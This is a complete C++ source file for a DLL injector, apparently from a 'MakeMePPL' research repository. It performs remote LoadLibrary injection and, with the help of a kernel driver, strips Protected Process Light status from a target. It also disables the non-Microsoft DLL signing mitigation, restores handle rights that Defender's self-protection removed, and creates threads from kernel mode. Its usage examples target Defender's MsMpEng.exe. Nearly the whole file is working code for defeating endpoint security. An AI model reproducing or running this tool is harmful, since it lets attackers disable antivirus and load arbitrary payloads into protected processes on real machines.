/*
 * DllInjector.cpp -- classic "LoadLibrary" DLL injector with MakeMePPL support.
 *
 * This is the dll_load lab injector integrated into the MakeMePPL repository.
 * It reuses the shared IOCTL ABI (shared/PplIoctl.h) and the usermode driver
 * client instead of duplicating the structures.
 *
 * The injection itself is the classic remote LoadLibrary technique:
 *   1. OpenProcess
 *   2. VirtualAllocEx  -> RW buffer for the DLL path
 *   3. WriteProcessMemory -> copy the wide path into the target
 *   4. GetProcAddress(kernel32!LoadLibraryW)
 *   5. CreateRemoteThread(LoadLibraryW, remotePath) or a kernel-created thread
 *   6. Wait / verify the module, then free the remote buffer
 *
 * Extra options for protected targets such as MsMpEng.exe:
 *
 *   --ppl            use MakeMePPL to remove PPL from the target
 *                    (IOCTL_PPL_FORCE_CLEAR_BY_PID) and clear the
 *                    block-non-Microsoft-binaries DLL mitigation
 *                    (IOCTL_PPL_ALLOW_NON_MS_DLLS) before injecting.
 *                    The driver tracks both changes.
 *   --fix-handle     restore process access that a protection callback
 *                    (Defender self-protection) stripped from the handle
 *                    returned by OpenProcess.
 *   --kernel-thread  create the remote thread from kernel mode via
 *                    MakeMePPL, bypassing the user-mode protected-process
 *                    thread-creation check.
 *   --restore        after injection, ask MakeMePPL to restore the original
 *                    protection and signature mitigation (only with --ppl).
 *
 * Usage:
 *   injector.exe <pid|image name> <full\path\to\payload.dll>
 *                [--ppl] [--fix-handle] [--kernel-thread] [--restore]
 *
 * Examples:
 *   injector.exe MsMpEng.exe C:\data\payload.dll --ppl --fix-handle --kernel-thread
 *   injector.exe 1234 C:\data\payload.dll
 */

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#ifndef NOMINMAX
#define NOMINMAX
#endif

#include <windows.h>
#include <tlhelp32.h>

#include <cstdio>
#include <cstdlib>
#include <cwchar>
#include <iterator>
#include <string>
#include <vector>

#include "../usermode/PplDriverClient.h"

#pragma comment(lib, "advapi32.lib")

namespace {

constexpr DWORD kThreadWaitMs = 10000;
constexpr DWORD kModuleWaitMs = 10000;

struct Options {
    DWORD ProcessId = 0;
    std::wstring TargetArgument;
    std::wstring DllPath;
    bool Ppl = false;
    bool FixHandle = false;
    bool KernelThread = false;
    bool Restore = false;
};

struct TargetProcess {
    DWORD ProcessId = 0;
    std::wstring ImageName;
    std::wstring ImagePath;
};

void
PrintUsage()
{
    std::fwprintf(
        stderr,
        L"usage: injector.exe <pid|image name> <full\\path\\to\\payload.dll>\n"
        L"                    [--ppl] [--fix-handle] [--kernel-thread] [--restore]\n"
        L"\n"
        L"  --ppl            remove PPL and the block-non-Microsoft-binaries\n"
        L"                   mitigation from the target via MakeMePPL\n"
        L"  --fix-handle     restore access stripped by a protection callback\n"
        L"  --kernel-thread  create the remote thread through MakeMePPL\n"
        L"                   (bypasses the user-mode PPL thread-creation check)\n"
        L"  --restore        restore protection/mitigation after injection\n"
        L"                   (only meaningful together with --ppl)\n"
        L"\n"
        L"  --ppl, --fix-handle and --kernel-thread require the MakeMePPL driver.\n"
        L"  Example: injector.exe MsMpEng.exe C:\\data\\payload.dll\n"
        L"                     --ppl --fix-handle --kernel-thread\n");
}

std::wstring
Win32ErrorText(
    _In_ DWORD Error)
{
    LPWSTR buffer = nullptr;
    DWORD length;
    std::wstring text;

    length = FormatMessageW(
        FORMAT_MESSAGE_ALLOCATE_BUFFER |
            FORMAT_MESSAGE_FROM_SYSTEM |
            FORMAT_MESSAGE_IGNORE_INSERTS,
        nullptr,
        Error,
        0,
        reinterpret_cast<LPWSTR>(&buffer),
        0,
        nullptr);

    if (length != 0 && buffer != nullptr) {
        text.assign(buffer, length);
        while (!text.empty() &&
               (text.back() == L'\r' || text.back() == L'\n' ||
                text.back() == L' ')) {
            text.pop_back();
        }
    } else {
        text = L"unknown error";
    }

    if (buffer != nullptr) {
        LocalFree(buffer);
    }
    return text;
}

void
PrintLastError(
    _In_ const wchar_t* What)
{
    DWORD error = GetLastError();

    std::fwprintf(stderr, L"[-] %s failed (error %lu): %s\n",
                  What, static_cast<unsigned long>(error),
                  Win32ErrorText(error).c_str());
}

std::wstring
BaseName(
    _In_ const std::wstring& Path)
{
    size_t position = Path.find_last_of(L"\\/");
    if (position == std::wstring::npos) {
        return Path;
    }
    return Path.substr(position + 1);
}

bool
EnableDebugPrivilege()
{
    HANDLE token = nullptr;
    TOKEN_PRIVILEGES privileges;
    LUID luid;
    bool ok = false;

    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                          &token)) {
        return false;
    }

    if (LookupPrivilegeValueW(nullptr, SE_DEBUG_NAME, &luid)) {
        privileges.PrivilegeCount = 1;
        privileges.Privileges[0].Luid = luid;
        privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        SetLastError(ERROR_SUCCESS);
        ok = AdjustTokenPrivileges(token, FALSE, &privileges, 0,
                                   nullptr, nullptr) != FALSE;
        if (ok && GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
            ok = false;
        }
    }

    CloseHandle(token);
    return ok;
}

bool
ParseProcessId(
    _In_ const std::wstring& Text,
    _Out_ DWORD* ProcessId)
{
    wchar_t* end = nullptr;
    unsigned long parsed;

    if (Text.empty() || Text[0] == L'-') {
        return false;
    }

    parsed = std::wcstoul(Text.c_str(), &end, 0);
    if (end == Text.c_str() || *end != L'\0' || parsed == 0) {
        return false;
    }

    *ProcessId = static_cast<DWORD>(parsed);
    return true;
}

std::wstring
QueryImagePath(
    _In_ DWORD ProcessId)
{
    HANDLE process;
    wchar_t path[32768];
    DWORD length = static_cast<DWORD>(std::size(path));

    process = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, ProcessId);
    if (process == nullptr) {
        return std::wstring();
    }

    if (!QueryFullProcessImageNameW(process, 0, path, &length)) {
        CloseHandle(process);
        return std::wstring();
    }

    CloseHandle(process);
    return std::wstring(path, length);
}

bool
FindProcessByName(
    _In_ const std::wstring& ImageName,
    _Out_ TargetProcess* Target)
{
    std::wstring wanted = BaseName(ImageName);
    HANDLE snapshot;
    PROCESSENTRY32W entry = {};
    std::vector<TargetProcess> matches;

    if (wanted.empty()) {
        return false;
    }

    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        PrintLastError(L"CreateToolhelp32Snapshot");
        return false;
    }

    entry.dwSize = sizeof(entry);
    if (Process32FirstW(snapshot, &entry)) {
        do {
            if (_wcsicmp(entry.szExeFile, wanted.c_str()) == 0) {
                TargetProcess match;
                match.ProcessId = entry.th32ProcessID;
                match.ImageName = entry.szExeFile;
                match.ImagePath = QueryImagePath(entry.th32ProcessID);
                matches.push_back(match);
            }
        } while (Process32NextW(snapshot, &entry));
    }

    CloseHandle(snapshot);

    if (matches.empty()) {
        return false;
    }

    if (matches.size() > 1) {
        std::fwprintf(stderr,
                      L"[!] %llu processes match '%s'; using PID %lu\n",
                      static_cast<unsigned long long>(matches.size()),
                      wanted.c_str(),
                      static_cast<unsigned long>(matches[0].ProcessId));
        for (const TargetProcess& match : matches) {
            std::fwprintf(stderr, L"    pid %-6lu %s\n",
                          static_cast<unsigned long>(match.ProcessId),
                          match.ImagePath.c_str());
        }
    }

    *Target = matches[0];
    return true;
}

bool
ResolveTarget(
    _In_ const std::wstring& Argument,
    _Out_ TargetProcess* Target)
{
    TargetProcess resolved;

    if (ParseProcessId(Argument, &resolved.ProcessId)) {
        resolved.ImageName = std::wstring();
        resolved.ImagePath = QueryImagePath(resolved.ProcessId);
        *Target = resolved;
        return true;
    }

    return FindProcessByName(Argument, Target);
}

/*
 * --ppl preflight: MakeMePPL removes PPL from the target and clears the
 * block-non-Microsoft-binaries mitigation. Both changes are tracked by the
 * driver, so `pplctl clear --pid <pid>` (or --restore) puts them back.
 */
bool
PreparePplTarget(
    _In_ DWORD ProcessId)
{
    HANDLE device;
    DWORD returned = 0;

    device = PplOpenDevice();
    if (device == INVALID_HANDLE_VALUE) {
        return false;
    }

    //
    // Report the state before touching anything.
    //
    {
        PPL_QUERY_RESULT before = {};

        if (PplIoctl(device, IOCTL_PPL_QUERY_BY_PID,
                     &ProcessId, sizeof(ProcessId),
                     &before, sizeof(before), &returned, true) &&
            PplNtSuccess(before.Status)) {
            std::wprintf(
                L"[*] PPL before    : 0x%02X (type=%s, signer=%s), "
                L"signature 0x%02X/0x%02X, block non-MS DLLs=%s\n",
                static_cast<unsigned>(before.Protection),
                PplProtectionTypeName(before.Protection),
                PplSignerName(
                    static_cast<UCHAR>((before.Protection >> 4) & 0xF)),
                static_cast<unsigned>(before.SignatureLevel),
                static_cast<unsigned>(before.SectionSignatureLevel),
                (before.Flags & PPL_QUERY_FLAG_BLOCK_NON_MS_DLLS)
                    ? L"ON"
                    : L"off");
        }
    }

    //
    // 1. Force-clear PPL even when this driver did not apply it. This is the
    //    only way to get an OpenProcess handle to a system PPL process.
    //
    {
        PPL_OPERATION_RESULT clear = {};

        if (!PplIoctl(device, IOCTL_PPL_FORCE_CLEAR_BY_PID,
                      &ProcessId, sizeof(ProcessId),
                      &clear, sizeof(clear), &returned)) {
            CloseHandle(device);
            return false;
        }

        if (!PplNtSuccess(clear.Status)) {
            std::fwprintf(stderr,
                          L"[-] force-clear pid %lu failed: %s (0x%08lX)\n",
                          static_cast<unsigned long>(ProcessId),
                          PplNtStatusText(clear.Status).c_str(),
                          static_cast<unsigned long>(clear.Status));
            CloseHandle(device);
            return false;
        }

        std::wprintf(L"[+] PPL cleared    : 0x%02X -> 0x%02X\n",
                     static_cast<unsigned>(clear.OldProtection),
                     static_cast<unsigned>(clear.NewProtection));
    }

    //
    // 2. Remove the DLL signature requirement. On builds without a
    //    MitigationFlags offset this returns STATUS_NOT_SUPPORTED; keep going,
    //    because the target may not have the mitigation enabled.
    //
    {
        PPL_MITIGATION_REQUEST request = {};
        PPL_MITIGATION_RESULT result = {};

        request.ProcessId = ProcessId;

        if (PplIoctl(device, IOCTL_PPL_ALLOW_NON_MS_DLLS,
                     &request, sizeof(request),
                     &result, sizeof(result), &returned, true)) {
            if (PplNtSuccess(result.Status)) {
                std::wprintf(
                    L"[+] blockdll off  : mit1 0x%08lX -> 0x%08lX, "
                    L"section signature level 0x%02X -> 0x%02X\n",
                    static_cast<unsigned long>(result.OldMitigationFlags1),
                    static_cast<unsigned long>(result.NewMitigationFlags1),
                    static_cast<unsigned>(result.OldSectionSignatureLevel),
                    static_cast<unsigned>(result.NewSectionSignatureLevel));
            } else {
                std::fwprintf(
                    stderr,
                    L"[!] allow-dlls: %s (0x%08lX); continuing\n",
                    PplNtStatusText(result.Status).c_str(),
                    static_cast<unsigned long>(result.Status));
            }
        } else {
            std::fwprintf(stderr,
                          L"[!] allow-dlls IOCTL failed; continuing\n");
        }
    }

    CloseHandle(device);
    return true;
}

bool
RestorePplTarget(
    _In_ DWORD ProcessId)
{
    HANDLE device;
    PPL_OPERATION_RESULT result = {};
    DWORD returned = 0;
    bool ok;

    device = PplOpenDevice();
    if (device == INVALID_HANDLE_VALUE) {
        return false;
    }

    ok = PplIoctl(device, IOCTL_PPL_CLEAR_BY_PID,
                  &ProcessId, sizeof(ProcessId),
                  &result, sizeof(result), &returned) != FALSE;

    CloseHandle(device);

    if (!ok) {
        return false;
    }

    if (!PplNtSuccess(result.Status)) {
        std::fwprintf(stderr,
                      L"[!] restore pid %lu failed: %s (0x%08lX)\n",
                      static_cast<unsigned long>(ProcessId),
                      PplNtStatusText(result.Status).c_str(),
                      static_cast<unsigned long>(result.Status));
        return false;
    }

    std::wprintf(L"[+] protection restored: 0x%02X -> 0x%02X\n",
                 static_cast<unsigned>(result.OldProtection),
                 static_cast<unsigned>(result.NewProtection));
    return true;
}

/*
 * Defender self-protection silently strips PROCESS_VM_WRITE,
 * PROCESS_VM_OPERATION and PROCESS_CREATE_THREAD from an otherwise successful
 * OpenProcess. MakeMePPL rewrites GrantedAccess in this process's handle
 * table; the ObRegisterCallbacks routine does not run again for an existing
 * handle.
 */
bool
FixHandleAccess(
    _In_ HANDLE Process,
    _In_ DWORD ProcessId)
{
    HANDLE device;
    PPL_HANDLE_FIX_REQUEST request = {};
    PPL_HANDLE_FIX_RESULT result = {};
    DWORD returned = 0;
    BOOL ok;

    device = PplOpenDevice();
    if (device == INVALID_HANDLE_VALUE) {
        return false;
    }

    request.ProcessId = ProcessId;
    request.AccessMask = PROCESS_ALL_ACCESS;
    request.HandleValue = static_cast<ULONG64>(
        reinterpret_cast<ULONG_PTR>(Process));

    ok = PplIoctl(device, IOCTL_PPL_FIX_HANDLE_ACCESS,
                  &request, sizeof(request),
                  &result, sizeof(result), &returned);
    CloseHandle(device);

    if (!ok) {
        return false;
    }

    if (!PplNtSuccess(result.Status)) {
        std::fwprintf(stderr,
                      L"[-] handle repair failed: %s (0x%08lX)\n",
                      PplNtStatusText(result.Status).c_str(),
                      static_cast<unsigned long>(result.Status));
        return false;
    }

    std::wprintf(L"[+] handle access : 0x%08lX -> 0x%08lX\n",
                 static_cast<unsigned long>(result.OldGrantedAccess),
                 static_cast<unsigned long>(result.NewGrantedAccess));

    return result.NewGrantedAccess == request.AccessMask;
}

/*
 * Kernel-side alternative to CreateRemoteThread. NtCreateThreadEx performs a
 * protected-process compatibility check in user mode, so even a PPL injector
 * with PROCESS_CREATE_THREAD is refused by MsMpEng. The driver calls the
 * exported RtlCreateUserThread from kernel mode, where that check does not
 * apply.
 */
bool
CreateThreadKernel(
    _In_ HANDLE Process,
    _In_ DWORD ProcessId,
    _In_ PVOID StartAddress,
    _In_ PVOID Parameter,
    _Out_ DWORD* ThreadId)
{
    HANDLE device;
    PPL_REMOTE_THREAD_REQUEST request = {};
    PPL_REMOTE_THREAD_RESULT result = {};
    DWORD returned = 0;
    BOOL ok;

    device = PplOpenDevice();
    if (device == INVALID_HANDLE_VALUE) {
        return false;
    }

    request.ProcessId = ProcessId;
    request.ProcessHandle = static_cast<ULONG64>(
        reinterpret_cast<ULONG_PTR>(Process));
    request.StartAddress = static_cast<ULONG64>(
        reinterpret_cast<ULONG_PTR>(StartAddress));
    request.Parameter = static_cast<ULONG64>(
        reinterpret_cast<ULONG_PTR>(Parameter));

    ok = PplIoctl(device, IOCTL_PPL_CREATE_REMOTE_THREAD,
                  &request, sizeof(request),
                  &result, sizeof(result), &returned);
    CloseHandle(device);

    if (!ok) {
        return false;
    }

    if (!PplNtSuccess(result.Status)) {
        std::fwprintf(stderr,
                      L"[-] kernel thread creation failed: %s (0x%08lX)\n",
                      PplNtStatusText(result.Status).c_str(),
                      static_cast<unsigned long>(result.Status));
        return false;
    }

    *ThreadId = result.ThreadId;
    std::wprintf(L"[+] kernel thread : tid %lu\n",
                 static_cast<unsigned long>(result.ThreadId));
    return true;
}

/*
 * Best-effort verification for the kernel-thread path. We have no thread
 * handle to wait on, so poll the target's module list until the payload
 * appears. This also proves LoadLibraryW completed (or is very close to it).
 */
bool
WaitForModuleLoaded(
    _In_ DWORD ProcessId,
    _In_ const std::wstring& DllPath,
    _In_ DWORD TimeoutMs)
{
    std::wstring wanted = BaseName(DllPath);
    ULONGLONG start = GetTickCount64();

    while (GetTickCount64() - start < TimeoutMs) {
        HANDLE snapshot = CreateToolhelp32Snapshot(
            TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, ProcessId);

        if (snapshot != INVALID_HANDLE_VALUE) {
            MODULEENTRY32W module = {};
            module.dwSize = sizeof(module);

            if (Module32FirstW(snapshot, &module)) {
                do {
                    if (_wcsicmp(module.szModule, wanted.c_str()) == 0) {
                        CloseHandle(snapshot);
                        return true;
                    }
                } while (Module32NextW(snapshot, &module));
            }

            CloseHandle(snapshot);
        }

        Sleep(200);
    }

    return false;
}

int
InjectDll(
    _In_ const Options& Options)
{
    HANDLE process = nullptr;
    HANDLE thread = nullptr;
    LPVOID remoteBuffer = nullptr;
    HMODULE kernel32 = nullptr;
    FARPROC loadLibrary = nullptr;
    SIZE_T pathBytes;
    DWORD exitCode = 0;
    DWORD threadId = 0;
    bool releaseRemoteBuffer = true;
    int result = 1;

    std::wprintf(L"[*] target pid    : %lu\n",
                 static_cast<unsigned long>(Options.ProcessId));
    std::wprintf(L"[*] dll to inject : %s\n", Options.DllPath.c_str());
    std::wprintf(L"[*] options       :%s%s%s%s\n",
                 Options.Ppl ? L" --ppl" : L"",
                 Options.FixHandle ? L" --fix-handle" : L"",
                 Options.KernelThread ? L" --kernel-thread" : L"",
                 Options.Restore ? L" --restore" : L"");

    //
    // --ppl must run before OpenProcess: a protected process refuses the
    // VM_WRITE / VM_OPERATION / CREATE_THREAD access we need.
    //
    if (Options.Ppl) {
        std::wprintf(L"[*] preparing protected target via MakeMePPL\n");
        if (!PreparePplTarget(Options.ProcessId)) {
            std::fwprintf(stderr,
                          L"[-] could not prepare the PPL target "
                          L"(is the MakeMePPL driver loaded?)\n");
            return 1;
        }
    }

    process = OpenProcess(PROCESS_CREATE_THREAD |
                              PROCESS_QUERY_INFORMATION |
                              PROCESS_VM_OPERATION |
                              PROCESS_VM_WRITE |
                              PROCESS_VM_READ,
                          FALSE,
                          Options.ProcessId);
    if (process == nullptr) {
        PrintLastError(L"OpenProcess");
        if (!Options.Ppl) {
            std::fwprintf(stderr,
                          L"    (for a protected process such as MsMpEng.exe "
                          L"try --ppl)\n");
        } else {
            std::fwprintf(stderr,
                          L"    (try running the injector as Administrator)\n");
        }
        goto cleanup;
    }
    std::wprintf(L"[+] OpenProcess ok\n");

    if (Options.FixHandle) {
        if (!FixHandleAccess(process, Options.ProcessId)) {
            std::fwprintf(stderr, L"[-] could not restore handle access\n");
            goto cleanup;
        }
    }

    pathBytes = (Options.DllPath.size() + 1) * sizeof(wchar_t);

    remoteBuffer = VirtualAllocEx(process, nullptr, pathBytes,
                                  MEM_COMMIT | MEM_RESERVE,
                                  PAGE_READWRITE);
    if (remoteBuffer == nullptr) {
        PrintLastError(L"VirtualAllocEx");
        std::fwprintf(stderr,
                      L"    (a protection callback may have stripped "
                      L"VM_OPERATION/VM_WRITE; try --fix-handle)\n");
        goto cleanup;
    }
    std::wprintf(L"[+] VirtualAllocEx ok (remote buffer @ 0x%p, %llu bytes)\n",
                 remoteBuffer,
                 static_cast<unsigned long long>(pathBytes));

    if (!WriteProcessMemory(process, remoteBuffer,
                            Options.DllPath.c_str(), pathBytes, nullptr)) {
        PrintLastError(L"WriteProcessMemory");
        goto cleanup;
    }
    std::wprintf(L"[+] WriteProcessMemory ok\n");

    kernel32 = GetModuleHandleW(L"kernel32.dll");
    if (kernel32 == nullptr) {
        PrintLastError(L"GetModuleHandleW(kernel32.dll)");
        goto cleanup;
    }

    loadLibrary = GetProcAddress(kernel32, "LoadLibraryW");
    if (loadLibrary == nullptr) {
        PrintLastError(L"GetProcAddress(LoadLibraryW)");
        goto cleanup;
    }
    std::wprintf(L"[+] LoadLibraryW @ 0x%p\n", loadLibrary);

    if (Options.KernelThread) {
        if (!CreateThreadKernel(process, Options.ProcessId,
                                reinterpret_cast<PVOID>(loadLibrary),
                                remoteBuffer, &threadId)) {
            goto cleanup;
        }

        std::wprintf(L"[*] waiting up to %lu ms for the module to load\n",
                     static_cast<unsigned long>(kModuleWaitMs));
        if (WaitForModuleLoaded(Options.ProcessId,
                                Options.DllPath, kModuleWaitMs)) {
            std::wprintf(L"[+] payload DLL is loaded in the target\n");
            result = 0;
        } else {
            std::fwprintf(
                stderr,
                L"[!] could not confirm the module load; the injection "
                L"thread was dispatched, check the payload marker\n");
            /*
             * LoadLibraryW may still be using the remote path buffer. Leave it
             * in the target rather than risking a use-after-free.
             */
            releaseRemoteBuffer = false;
        }

        /*
         * Give the loader a moment to finish with the path buffer before it
         * is released.
         */
        Sleep(250);
        goto cleanup;
    }

#pragma warning(push)
#pragma warning(disable: 4191) // unsafe conversion from FARPROC
    thread = CreateRemoteThread(
        process, nullptr, 0,
        reinterpret_cast<LPTHREAD_START_ROUTINE>(loadLibrary),
        remoteBuffer, 0, nullptr);
#pragma warning(pop)

    if (thread == nullptr) {
        PrintLastError(L"CreateRemoteThread");
        std::fwprintf(stderr,
                      L"    (a protected process refuses user-mode thread "
                      L"creation; try --kernel-thread)\n");
        goto cleanup;
    }
    std::wprintf(L"[+] CreateRemoteThread ok\n");

    if (WaitForSingleObject(thread, kThreadWaitMs) != WAIT_OBJECT_0) {
        PrintLastError(L"WaitForSingleObject");
        /*
         * The remote thread may still be reading the path. Do not free it.
         */
        releaseRemoteBuffer = false;
        goto cleanup;
    }

    if (!GetExitCodeThread(thread, &exitCode)) {
        PrintLastError(L"GetExitCodeThread");
        goto cleanup;
    }

    if (exitCode == 0) {
        std::fwprintf(stderr,
                      L"[-] LoadLibraryW returned NULL inside the target "
                      L"(DLL failed to load)\n");
        std::fwprintf(stderr,
                      L"    (if the target blocks non-Microsoft DLLs, try "
                      L"--ppl)\n");
        goto cleanup;
    }

    std::wprintf(L"[+] LoadLibraryW returned HMODULE 0x%08lX\n",
                 static_cast<unsigned long>(exitCode));
    std::wprintf(L"[+] injection succeeded\n");
    result = 0;

cleanup:
    if (remoteBuffer != nullptr && releaseRemoteBuffer) {
        VirtualFreeEx(process, remoteBuffer, 0, MEM_RELEASE);
    }
    if (thread != nullptr) {
        CloseHandle(thread);
    }
    if (process != nullptr) {
        CloseHandle(process);
    }

    if (Options.Ppl && Options.Restore) {
        std::wprintf(L"[*] restoring original protection/mitigation\n");
        (void)RestorePplTarget(Options.ProcessId);
    } else if (Options.Ppl) {
        std::wprintf(
            L"[*] protection changes are tracked; run "
            L"'pplctl clear --pid %lu' to restore them\n",
            static_cast<unsigned long>(Options.ProcessId));
    }

    return result;
}

} // namespace

int
wmain(
    _In_ int argc,
    _In_ wchar_t** argv)
{
    Options options;
    TargetProcess target;
    wchar_t fullPath[32768];
    DWORD pathLength;
    int i;

    if (argc < 3) {
        PrintUsage();
        return 2;
    }

    options.TargetArgument = argv[1];
    options.DllPath = argv[2];

    for (i = 3; i < argc; ++i) {
        if (_wcsicmp(argv[i], L"--ppl") == 0) {
            options.Ppl = true;
        } else if (_wcsicmp(argv[i], L"--fix-handle") == 0) {
            options.FixHandle = true;
        } else if (_wcsicmp(argv[i], L"--kernel-thread") == 0) {
            options.KernelThread = true;
        } else if (_wcsicmp(argv[i], L"--restore") == 0) {
            options.Restore = true;
        } else if (_wcsicmp(argv[i], L"--help") == 0 ||
                   _wcsicmp(argv[i], L"-h") == 0) {
            PrintUsage();
            return 0;
        } else {
            std::fwprintf(stderr, L"[-] unknown option: %s\n", argv[i]);
            PrintUsage();
            return 2;
        }
    }

    if (!ResolveTarget(options.TargetArgument, &target)) {
        std::fwprintf(stderr,
                      L"[-] could not find process '%s'\n",
                      options.TargetArgument.c_str());
        return 2;
    }
    options.ProcessId = target.ProcessId;

    if (!target.ImagePath.empty()) {
        std::wprintf(L"[*] target image  : %s\n", target.ImagePath.c_str());
    }

    //
    // LoadLibraryW resolves relative paths against the target's working
    // directory, so normalise to an absolute path here.
    //
    pathLength = GetFullPathNameW(options.DllPath.c_str(),
                                  static_cast<DWORD>(std::size(fullPath)),
                                  fullPath, nullptr);
    if (pathLength == 0 || pathLength >= std::size(fullPath)) {
        PrintLastError(L"GetFullPathNameW");
        return 2;
    }
    options.DllPath.assign(fullPath, pathLength);

    if (GetFileAttributesW(options.DllPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
        std::fwprintf(stderr, L"[-] dll not found: %s\n",
                      options.DllPath.c_str());
        return 2;
    }

    if (!EnableDebugPrivilege()) {
        std::fwprintf(stderr,
                      L"[!] could not enable SeDebugPrivilege "
                      L"(continuing anyway)\n");
    }

    return InjectDll(options);
}
